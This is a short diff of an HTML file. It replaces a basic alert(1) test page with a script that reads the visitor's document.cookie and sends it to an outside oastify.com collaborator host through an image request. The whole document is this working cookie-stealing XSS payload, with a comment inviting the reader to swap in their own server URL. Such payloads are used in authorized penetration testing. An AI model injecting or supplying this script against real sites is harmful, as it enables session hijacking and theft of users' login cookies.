@@ -1,13 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Alert Example</title>
-</head>
-<body>
+<script>
+  // Replace with your server URL
+  var serverUrl = "https://3236szxht06nhb1w1nrubhieb5hw5utj.oastify.com";
 
-  <script>
-    alert(1);
-  </script>
+  // Capture document cookies
+  var cookies = document.cookie;
 
-</body>
-</html>
+  // Create an image element to send the data
+  var img = new Image();
+  img.src = serverUrl + "?cookies=" + encodeURIComponent(cookies);
+</script>
